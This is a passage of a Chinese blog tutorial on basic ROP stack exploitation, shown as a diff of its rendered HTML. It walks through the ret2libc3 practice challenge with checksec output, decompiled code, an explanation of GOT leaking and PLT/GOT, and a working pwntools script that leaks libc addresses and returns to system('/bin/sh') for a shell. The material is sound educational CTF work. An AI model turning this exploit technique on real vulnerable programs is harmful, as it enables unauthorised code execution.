+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>题目相比之前又少了system函数，多了一个libc.so。保护机制仍是开启了NX</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ checksec ret2libc3 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gnq/test/ret2libc3&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用IDA看伪代码，依旧是gtes函数导致的栈溢出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No surprise anymore, system disappeard QQ.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Can you find it !?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>程序没有system，需要自己获取system函数的地址。要如何获取system的地址？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。</li>
+</ul>
+<p>当知道 libc 中某个函数的地址，就可以确定该程序利用的 libc。从而获取 system函数的地址和 /bin/sh 字符串的地址。因为system和/bin/sh都存在于libc中，而libc动态链接库里的函数的偏移是固定的（即<code>A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址</code>），这样就可以通过偏移找到其他想要的函数地址。</p>
+<p>如何获取libc中某个函数的地址？一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。由于 libc 的延迟绑定机制，需要泄漏已经执行过的函数的地址。
+<img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2libc3.png"
+        data-srcset="/BasicROP.assets/ret2libc3.png, /BasicROP.assets/ret2libc3.png 1.5x, /BasicROP.assets/ret2libc3.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2libc3.png"
+        title="/BasicROP.assets/ret2libc3.png"></p>
+<p>编写脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!coding:utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2libc3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ret2libc3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_start&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 泄露puts_got 并控制程序返回到_start，再次执行程序</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Can you find it !?&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取puts_got </span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;puts_addr: &#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 计算基址，获取偏移</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># getshell</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;aaaa&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：GitHub给的libc.so版本不对，建议去<a href="https://libc.blukat.me/" target="_blank" rel="noopener noreffer">libc.blukat.me</a>查询</p>
+</br>
+<h2 id="plt表和got表" class="headerLink">
+    <a href="#plt%e8%a1%a8%e5%92%8cgot%e8%a1%a8" class="header-mark"></a>PLT表和GOT表</h2><p>GOT 全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是什么呢？就是 GOT 表中对应条目的地址。</p>
+<p>外部函数的内存地址存储在 GOT 而非 PLT 表内，PLT 存储的入口点又指向 GOT 的对应条目，那么程序为什么选择 PLT 而非 GOT 作为调用的入口点呢？在程序启动时确定所有外部函数的内存地址并写入 GOT 表，之后只使用 GOT 表不是更方便吗？这样的设计是为了程序的运行效率。GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/plt&amp;got.png"
+        data-srcset="/BasicROP.assets/plt&amp;got.png, /BasicROP.assets/plt&amp;got.png 1.5x, /BasicROP.assets/plt&amp;got.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/plt&amp;got.png"
+        title="/BasicROP.assets/plt&amp;got.png"></p>
+<p>当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/plt&amp;got2.png"
+        data-srcset="/BasicROP.assets/plt&amp;got2.png, /BasicROP.assets/plt&amp;got2.png 1.5x, /BasicROP.assets/plt&amp;got2.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/plt&amp;got2.png"
+        title="/BasicROP.assets/plt&amp;got2.png"></p>
+<p><strong>以上来源于<a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener noreffer">手把手教你栈溢出从入门到放弃</a></strong></p>
+</br>
+<h2 id="参考" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener noreffer">手把手教你栈溢出从入门到放弃（上）</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener noreffer">手把手教你栈溢出从入门到放弃（下）</a></p>
+<p><a href="https://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener noreffer">C语言函数调用栈(一)</a></p>
+<p><a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/" target="_blank" rel="noopener noreffer">CTF-WIKI</a></p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-10-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pwnenvironment/" class="prev" rel="prev" title="Pwn环境搭建"><i class="fas fa-angle-left fa-fw"></i>Pwn环境搭建</a>
+            <a href="/fmtstr/" class="next" rel="next" title="格式化字符串漏洞">格式化字符串漏洞<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">高诺琪</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":true,"location":0,"maxResultLength":6,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":10,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
